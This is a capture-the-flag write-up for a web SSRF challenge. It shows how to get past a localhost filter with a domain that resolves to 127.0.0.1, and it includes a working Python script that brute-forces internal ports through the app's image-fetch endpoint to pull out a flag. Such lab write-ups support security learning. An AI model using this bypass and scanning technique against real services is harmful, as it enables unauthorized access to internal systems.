# web-ssrf
There is a localserver that is only accessible locally, this means we have to try and fetch the flag file from the localserver (it will be encoded and tried to be rendered as a png file which won't work, we can view the source and get the base64 string for the flag)

The local server:
```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())
```

Strings like 'localhost' or '127.0.0.1' is filtered, we have to find a way to bypass this. Luckily there is a site which DNS resolve to localhost, that is `fbi.com`
```bash
$ nslookup fbi.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	fbi.com
Address: 127.0.0.1
```

We can set the image url to `http://fbi.com:PORT/flag.txt` and bruteforce the port number (only ~300 ports) from 1500 to 1800 and check the answer to get the flag. 

Here is a script for that:
```python
import requests
import re
import base64

url = 'http://host8.dreamhack.games:21613/' # challenge's url

def attmp(port): # port scanning
	payload = {'url': f'http://fbi.com:{port}/flag.txt'}
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	resp = requests.post(f'{url}/img_viewer', data=payload, headers=headers)
	if resp.status_code == 200:
		m = re.search(r'REh7.*9',resp.text)

		if not m:
			print(f'Local server not found on port {port}')
			return 0 

		flag = base64.b64decode(re.search(r'REh7.*9',resp.text).group())
		print('Flag found: ' + flag.decode("utf8"))
		return 1
		
for i in range(1500, 1801):
	if attmp(i):
		exit()

``` 
